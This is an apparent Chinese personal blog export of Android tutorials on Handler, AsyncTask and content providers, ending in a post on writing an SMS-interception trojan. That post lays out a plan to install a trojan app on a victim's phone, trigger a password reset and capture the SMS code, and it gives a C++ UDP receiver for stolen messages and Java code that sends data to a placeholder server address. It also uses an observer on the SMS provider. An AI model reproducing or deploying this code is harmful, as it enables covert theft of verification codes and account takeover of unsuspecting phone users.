<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Handler handler = <span class="keyword">new</span> Handler()</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span></span></span><br><span class="line"><span class="function">			</span>&#123;</span><br><span class="line">				String str = (String) msg.obj;</span><br><span class="line">				tv_tx.setText(str);</span><br><span class="line">				Log.d(<span class="string">"wker"</span>, (Looper.getMainLooper()==Looper.myLooper())+<span class="string">""</span>);</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br></pre></td></tr></table></figure>
<p>很简单，我们重写这个handleMessage这个方法，这个对象是在我们的主线程的，所以可以操作UI，当我们调用<code>sendMessage</code>这个方法的时候我们就会接受到这个消息，我们可以检查下是不是在主线程，确实是在主线程，输出为true。<br>当然我们还有一种就是延迟执行，意思就是隔几秒才进行UI的操作：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">handler.postDelayed(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		tv_tx.setText(<span class="string">"test"</span>);</span><br><span class="line">		Log.d(<span class="string">"wker"</span>, <span class="string">"test"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;,<span class="number">10000</span>);</span><br></pre></td></tr></table></figure>
<p>这个就是所在10s之后执行，测试中发现同样可以操作UI。<br>但是要注意的是，我们并不能在子线程中直接创建这个Handler对象，因为我们主线程中拥有<code>Looper</code>对象，而子线程中没有，所以我们先要给他准备一个，具体的操作代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Looper.prepare();<span class="comment">//Looper初始化</span></span><br><span class="line"><span class="comment">//Handler初始化 需要注意, Handler初始化传入Looper对象是子线程中缓存的Looper对象</span></span><br><span class="line">Handler mHandler = <span class="keyword">new</span> Handler(Looper.myLooper());</span><br><span class="line">Looper.loop();<span class="comment">//死循环</span></span><br></pre></td></tr></table></figure>
<p>但是我们下面的代码就没办法执行了，因为那个loop就是在哪里一直死循环了，其实主线程的UI操作也就是这样死循环，但是为什么不会出现ANR的这个异常，这个是因为Linux的一些原因。</p>
<h3 id="AsyncTask"><a href="#AsyncTask" class="headerlink" title="AsyncTask"></a>AsyncTask</h3><p>这个就是很方便很好地一个东西，用来新建线程并且可以操作UI，我们需要继承这个类，然后重写一些方法，他是一个泛型，又是那个需要传入的参数，第一个是我们后台运行所要接受的参数类型，第二个是我们进行数据更新的时候，所要传入的参数类型，第三个是我们后台运行的返回值的参数（传递给<code>onPostExecute</code>方法的）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyAsy</span> <span class="keyword">extends</span> <span class="title">AsyncTask</span>&lt;<span class="title">String</span>, <span class="title">String</span>, <span class="title">String</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPreExecute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		Log.d(<span class="string">"wker"</span>, <span class="string">"开始执行"</span>);</span><br><span class="line">		<span class="keyword">super</span>.onPreExecute();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> String <span class="title">doInBackground</span><span class="params">(String... params)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">				String string = params[<span class="number">0</span>];</span><br><span class="line">				publishProgress(i+<span class="string">""</span>);</span><br><span class="line">				Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> params[<span class="number">0</span>]+<span class="string">"---"</span>+params.length;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onProgressUpdate</span><span class="params">(String... values)</span> </span>&#123;</span><br><span class="line">		tv_tx.setText(values[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">super</span>.onProgressUpdate(values);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPostExecute</span><span class="params">(String result)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		tv_tx.setText(result);</span><br><span class="line">		<span class="keyword">super</span>.onPostExecute(result);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般写在内部类中，好调用，当我们执行对象的<code>execute</code>方法的时候，我们先执行<code>onPreExecute</code>方法，也就是一些准备操作，在主线程中，比如我们的加载对话框出现，然后执行<code>doInBackground</code>方法，是在子线程中执行，传进来的参数也就是我们<code>execute</code>的时候传进来的可变长度的参数，返回值是提供给<code>onPostExecute</code>方法（这个方法运行在主线程中）的，在我们加载的过程中可能会报告进度给UI，<code>onProgressUpdate</code>这个方法就是用来接收进度的，在主线程中，用来操作进度条的。</p>
<p><code>execute</code>和<code>doInBackground</code>的参数以及: 是第一个泛型<br><code>onProgressUpdate</code>：这个的参数是第二个泛型<br><code>onPostExecute</code>的参数和<code>doInBackground</code>的返回值是第三个泛型</p>
<p>AsyncTask这个类内部有一个静态的线程池，是用来要用到线程的时候拿出线程用的。</p>
<p>在主线程中调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyAsy ma = <span class="keyword">new</span> MyAsy();</span><br><span class="line">ma.execute(<span class="string">"cecece"</span>);</span><br></pre></td></tr></table></figure>
<p>这样我们就可以进行子线程中操作了。</p>
<p>遗留线程处理，安卓当中主线程结束，子线程还不结束，这个和Windows中有点区别，所以我们需要主线程结束之后子线程也要结束，我们可以设置一个标志位，在主线程销毁的时候，将这个标志位设置为false，子线程检查到是false的时候，就结束任务就可以了。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓内容提供者</title>
    <url>/2020/03/06/%E5%AE%89%E5%8D%93%E5%86%85%E5%AE%B9%E6%8F%90%E4%BE%9B%E8%80%85/</url>
    <content><![CDATA[<h2 id="内容提供者"><a href="#内容提供者" class="headerlink" title="内容提供者"></a>内容提供者</h2><p>这个东西主要是用来提供外部访问自身数据库的，也就是相对于给我们一个出口，将我们的数据对外提供。<br>这个东西一般是和数据库进行配合使用。<br>所以首先我们先构造一个数据库：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MySQLiteOpenHelper mso = <span class="keyword">new</span> MySQLiteOpenHelper(getBaseContext());</span><br><span class="line">mso.getReadableDatabase();</span><br></pre></td></tr></table></figure>
<p>先写一个自己的数据库，然后实例化创建我们的数据库，数据库代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.android_study13.database;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteDatabase;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteDatabase.CursorFactory;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteOpenHelper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySQLiteOpenHelper</span> <span class="keyword">extends</span> <span class="title">SQLiteOpenHelper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MySQLiteOpenHelper</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(context, <span class="string">"DATA.db"</span>, <span class="keyword">null</span>, <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(SQLiteDatabase db)</span> </span>&#123;</span><br><span class="line">		db.execSQL(<span class="string">"create table student(id INTEGER PRIMARY KEY AUTOINCREMENT,name TEXT,age INTEGER)"</span>);</span><br><span class="line">		db.execSQL(<span class="string">"create table teacher(id INTEGER PRIMARY KEY AUTOINCREMENT,name TEXT,kemu TEXT)"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="keyword">int</span> oldVersion, <span class="keyword">int</span> newVersion)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是在创建的时候我们创建我们的数据库。<br>一个学生表和老师表。<br>下面是关键，我们需要写一个继承于<code>ContentProvider</code>的类，这个类是用来重写那些方法的，而且这个类也是我们需要配置的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	Log.d(<span class="string">"wker"</span>, <span class="string">"Oncreate"</span>);</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		SQLiteOpenHelper open = <span class="keyword">new</span> MySQLiteOpenHelper(getContext());</span><br><span class="line">		database = open.getWritableDatabase();</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;<span class="comment">//返回初始化是否成功</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们在这个方法中重写，主要使用来获取数据库操作对象的。<br>下面写插入数据：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Cursor <span class="title">query</span><span class="params">(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)</span> </span>&#123;</span><br><span class="line">	Log.d(<span class="string">"wker"</span>, <span class="string">"query"</span>);</span><br><span class="line">	ContentResolver resolver = getContext().getContentResolver();</span><br><span class="line">	resolver.notifyChange(uri, <span class="keyword">null</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>返回一个数据库的迭代器，意思就是将我们数据库查询的对象返回回去，我这里没写查询，但是要看下面的两句代码，这个就是通过上下文环境获取内容解析者，获取到解析者之后通知内容监听者，我们有新的信息了。<br>添加方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Uri <span class="title">insert</span><span class="params">(Uri uri, ContentValues values)</span> </span>&#123;</span><br><span class="line">	Log.d(<span class="string">"wker"</span>, <span class="string">"insert"</span>);</span><br><span class="line">	<span class="keyword">long</span> result=-<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">switch</span>(matcher.match(uri))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> STUDENT:</span><br><span class="line">			result = database.insert(<span class="string">"student"</span>, <span class="keyword">null</span>, values);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> TEACHER:</span><br><span class="line">			result = database.insert(<span class="string">"teacher"</span>, <span class="keyword">null</span>, values);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Uri.parse(<span class="string">"result://io.wker666/"</span>+result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就是数据库的插入，传进来一个Uri的对象，这个对象中有我们要进行操作的数据，我们可以通过UriMatcher的匹配方法判断是不是满足某个条件的Uri。<br>所以我们先要去创建一个UriMatcher的对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> UriMatcher matcher = <span class="keyword">new</span> UriMatcher(UriMatcher.NO_MATCH);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> STUDENT = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TEACHER = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//添加URI匹配方法</span></span><br><span class="line">	matcher.addURI(<span class="string">"io.wker666"</span>, <span class="string">"student"</span>, STUDENT);<span class="comment">//匹配的时候返回的值</span></span><br><span class="line">	matcher.addURI(<span class="string">"io.wker666"</span>, <span class="string">"teacher"</span>, TEACHER);<span class="comment">//匹配的时候返回的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>UriMatcher对象是专门用来进行匹配Uri的就有点像正则匹配器，在初始化的时候传进去一个int值，这个值代表的是我们没有匹配到结果的时候我们返回的结果，<code>addURI</code>这个方法是用来添加Uri匹配的，第一个参数是Uri的域名，第二个数路径，第三个参数是我们的返回值，这里我们返回一个常量，上面定义了的。<br>所以我们在插入数据的时候，我们首先匹配这个Uri对象，然后根据返回值来给特定的表段进行增删改查。<br>最后插入完毕之后我们就将我们的结果返回回去。<br>比较特别的是一个<code>getType()</code>方法，这个方法主要是用来判断Uri对象所对应的类型的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getType</span><span class="params">(Uri uri)</span> </span>&#123;</span><br><span class="line">	Log.d(<span class="string">"wker"</span>, <span class="string">"getType"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我没改，返回的一般是一个MIME的字符串。<br>写完之后，我们就要将我们的这个类配置我们XML文件中：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:allowBackup</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:icon</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">".MainActivity"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">provider</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">"com.example.android_study13.provider.MyContentProvider"</span></span></span><br><span class="line"><span class="tag">		<span class="attr">android:authorities</span>=<span class="string">"io.wker666"</span></span></span><br><span class="line"><span class="tag">		<span class="attr">android:exported</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>最关键的就是那个<code>provider</code>这个节点，<code>name</code>属性使我们需要对外提供的全类名，如果不想写全类名，那么就要将我们的包写在配置文件根节点上，<code>authorities</code>这个属性使用来表示我们的根Uri的，<code>exported</code>这个属性必须要要，否则会抛出异常，true代表是对外可以访问。</p>
<h2 id="内容解析者"><a href="#内容解析者" class="headerlink" title="内容解析者"></a>内容解析者</h2><p>用来获取内容提供给我们的数据的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onQuery</span><span class="params">(View view)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ContentResolver resolver = getContentResolver();<span class="comment">//内容解析者</span></span><br><span class="line">	Uri uri = Uri.parse(<span class="string">"content://io.wker666"</span>);</span><br><span class="line">	resolver.query(uri, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比较简单，收我们先要获取内容解析者，这个东西应该是个单例对象，获取之后我们就能调用相对应的内容提供者中的方法了，但是之前我们先要配一下我们的Uri对象，配置的时候，我们不能忘记丢掉我们的协议名content://，也就是我们内容提供者中所提供的类名，然后进行查询就好了，也就会调用我们在内容提供者中编写的方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onInsert</span><span class="params">(View view)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ContentResolver resolver = getContentResolver();<span class="comment">//内容解析者</span></span><br><span class="line">	Uri uri = Uri.parse(<span class="string">"content://io.wker666/"</span>+<span class="string">"teacher"</span>);</span><br><span class="line">	</span><br><span class="line">	ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">	values.put(<span class="string">"name"</span>, <span class="string">"wker"</span>);</span><br><span class="line">	values.put(<span class="string">"kemu"</span>, <span class="string">"c"</span>);</span><br><span class="line">	Uri reu= resolver.insert(uri, values );</span><br><span class="line">	Log.d(<span class="string">"wker"</span>, reu.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个和上面类似，也就是配置我们的Uri，配置好之后，我们要加入的数据，通过<code>ContentValues</code>这个键值对的对象，然后将返回给我们的Uri接受一下，也就是得到我们加入了第几行。</p>
<h2 id="内容监听者"><a href="#内容监听者" class="headerlink" title="内容监听者"></a>内容监听者</h2><p>这个东西也是比较简单，主要是重写父类的方法，新建一个类，继承<code>ContentObserver</code>这个类，然后重写我们的<code>onChange</code>方法，也就是在内容提供者有对应操作的时候会给我们提供数据：<br><code>public void onChange(boolean selfChange, Uri uri)</code>，可以看到传进来一个Uri，也就是我们要的数据。<br>我们在使用这个东西之前我们先要注册这个内容监听者：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> MyObserver mco;<span class="comment">//也就是我们自定义的那个内容监听者</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">一些代码</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">mco = <span class="keyword">new</span> MyObserver(<span class="keyword">new</span> Handler());</span><br><span class="line">Uri uri = Uri.parse(<span class="string">"content://sms"</span>);</span><br><span class="line">getContentResolver().registerContentObserver(uri, <span class="keyword">true</span>, mco);</span><br></pre></td></tr></table></figure>
<p>注册也比较简单，就是通过内容解析者来注册这个内容监听者，第一个参数是我们要监听的Uri，第二个参数是我们是否想要进行模糊匹配，第三个参数就是我们的实例对象。<br>之后我们有数据传输的时候我们就会调用<code>onChange</code>方法了。<br>我们如果想要注销的话呢：<br><code>getContentResolver().unregisterContentObserver(mco);</code><br>这个样子就可以进行注销内容监听者了。<br>但是有一点要注意，我们一定要在数据传输的时候要使用内容解析者的notify方法通知内容监听者：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ContentResolver resolver = getContext().getContentResolver();</span><br><span class="line">resolver.notifyChange(uri, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>
<p>也就是这个东西，否则我们是接收不到的。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>实现拦截码</title>
    <url>/2020/03/05/%E5%AE%9E%E7%8E%B0%E6%8B%A6%E6%88%AA%E7%A0%81/</url>
    <content><![CDATA[<p>项目写时间长了，出来散散心。</p>
<h1 id="拦截马"><a href="#拦截马" class="headerlink" title="拦截马"></a>拦截马</h1><p>主要是用来拦截短信，主要是黑客用来实现所谓的盗号所设计的。<br>思路比较简单。</p>
<ol>
<li>首先先给受害者发送可以劫持短信的APP木马</li>
<li>受害者打开木马APP</li>
<li>攻击者申请更换密码</li>
<li>收到短信，劫持到短信信息</li>
<li>可根据需要，攻击者更换原先短信的内容</li>
</ol>
<p>思路比较简单，但是有两点是核心，一是如何劫持短信，劫持到短信攻击者如何进行获取。<br>先看下劫持的效果。<br>测试，所以我使用的是安卓模拟器：</p>
<ol>
<li>一台服务器</li>
<li>安卓虚拟机</li>
</ol>
<p><img src="img1.gif" alt="实现方法"></p>
<p>就和动图中的一样，就是受害者打开手机存在木马的手机APP，当接受到或者发送短信的时候就会被我们拦截到。</p>
<h2 id="劫持短信"><a href="#劫持短信" class="headerlink" title="劫持短信"></a>劫持短信</h2><p>这里我提供一个比较简单的方法，也是比较官方的一个方法，就是在安卓信息发送和接受的时候，短信APP会使用内容提供者给内容解析的APP一个消息，会让存在内容解析的APP响应<code>ContentObserver</code>子类对应的<code>onChange</code>方法。然后通过Socket发送给我们木马的接收服务器，就实现一次攻击。</p>
<h3 id="服务端编写"><a href="#服务端编写" class="headerlink" title="服务端编写"></a>服务端编写</h3><p>这个一般是用来放在服务器上的，所以我就用C++来写了，界面很简单，就是基本的画一下，一个<code>ListBox</code>就可以了。<br>服务端的代码，基本没什么难度，就是一个简单的Socket程序，我这里用的是UDP，用TCP的话呢，对于这种程序，感觉会有点傻，基本的实现代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">UINT <span class="title">MyThread</span><span class="params">(LPVOID lparm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ClanjiemaServiceDlg * dlg= (ClanjiemaServiceDlg *)lparm;</span><br><span class="line"></span><br><span class="line">	WSAData wSd;           <span class="comment">//初始化信息</span></span><br><span class="line">	SOCKET soRecv;              <span class="comment">//接收SOCKET</span></span><br><span class="line">	<span class="keyword">char</span>* pszRecv = <span class="literal">NULL</span>; <span class="comment">//接收数据的数据缓冲区指针</span></span><br><span class="line">	<span class="keyword">int</span> nRet = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> dwSendSize = <span class="number">0</span>;</span><br><span class="line">	SOCKADDR_IN siRemote,siLocal;<span class="comment">//远程发送机地址和本机接收机地址</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>),&amp;wSd) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	soRecv = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);</span><br><span class="line">	<span class="keyword">if</span> (soRecv == SOCKET_ERROR) &#123;</span><br><span class="line">		WSACleanup();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	siLocal.sin_family = AF_INET;</span><br><span class="line">	siLocal.sin_port = htons(<span class="number">6666</span>);</span><br><span class="line">	siLocal.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">	<span class="keyword">if</span> (bind(soRecv,(SOCKADDR*)&amp;siLocal,<span class="keyword">sizeof</span>(siLocal)) == SOCKET_ERROR) &#123;</span><br><span class="line">		WSACleanup();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">try</span></span><br><span class="line">	&#123;</span><br><span class="line">		pszRecv = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4096</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (CException* e)</span><br><span class="line">	&#123;</span><br><span class="line">		AfxMessageBox(<span class="string">"初始化内存失败！"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memset</span>(pszRecv,<span class="number">0</span>,<span class="number">4096</span>);</span><br><span class="line">	dwSendSize = <span class="keyword">sizeof</span>(siRemote);</span><br><span class="line">	<span class="keyword">while</span>((nRet = recvfrom(soRecv,pszRecv,<span class="number">4096</span>,<span class="number">0</span>,(SOCKADDR*)&amp;siRemote,&amp;dwSendSize)) != SOCKET_ERROR)</span><br><span class="line">	&#123;</span><br><span class="line">		pszRecv[nRet]=<span class="string">'\0'</span>;</span><br><span class="line">		CString s;</span><br><span class="line">		s.Format(<span class="string">"%s : %s"</span>,inet_ntoa(siRemote.sin_addr),pszRecv);</span><br><span class="line">		dlg-&gt;m_ListBox.AddString(s);</span><br><span class="line">	&#125;</span><br><span class="line">	closesocket(soRecv);</span><br><span class="line">	<span class="keyword">delete</span>[] pszRecv;</span><br><span class="line">	WSACleanup();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL ClanjiemaServiceDlg::OnInitDialog()</span><br><span class="line">&#123;</span><br><span class="line">	CDialogEx::OnInitDialog();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line">	<span class="comment">//  执行此操作</span></span><br><span class="line">	SetIcon(m_hIcon, TRUE);			<span class="comment">// 设置大图标</span></span><br><span class="line">	SetIcon(m_hIcon, FALSE);		<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line">	AfxBeginThread(MyThread,(LPVOID)<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单的说一下，在<code>OnInitDialog</code>中启动我们的Socket线程，用来接受我们的信息，Socket这块基本没什么变数，就是照葫芦画瓢，不愿意写的直接复制就好了。</p>
<h3 id="木马编写"><a href="#木马编写" class="headerlink" title="木马编写"></a>木马编写</h3><p>首先我们先要实现java层的实现UDP协议的发送，基本也就是照葫芦画瓢，首先我们写一个方法，用来将我们构造的String字符串发送给我们的服务端。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">SendNetMessage</span><span class="params">(String str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	sMessage = str;</span><br><span class="line">	<span class="keyword">new</span> Thread()&#123;</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			Log.d(<span class="string">"wker"</span>, sMessage);</span><br><span class="line">			DatagramSocket socket = <span class="keyword">null</span>;</span><br><span class="line">			DatagramPacket packet = <span class="keyword">null</span>;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				socket = <span class="keyword">new</span> DatagramSocket();</span><br><span class="line">				packet = <span class="keyword">new</span> DatagramPacket(sMessage.getBytes(<span class="string">"GBK"</span>),sMessage.getBytes(<span class="string">"GBK"</span>).length,InetAddress.getByName(<span class="string">"XXX.XXX.XXX.XXX"</span>),<span class="number">6666</span>);</span><br><span class="line">				socket.send(packet);</span><br><span class="line">				socket.close();</span><br><span class="line">			&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我定义了一个静态字符串，用来转储字符串的，然后安卓高版本是不支持在主线程进行网络操作的，我们就写个新的线程，用来专门发送数据，这里需要注意的是，我们需要在<code>AndroidManifest.xml</code>中配置一个权限：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
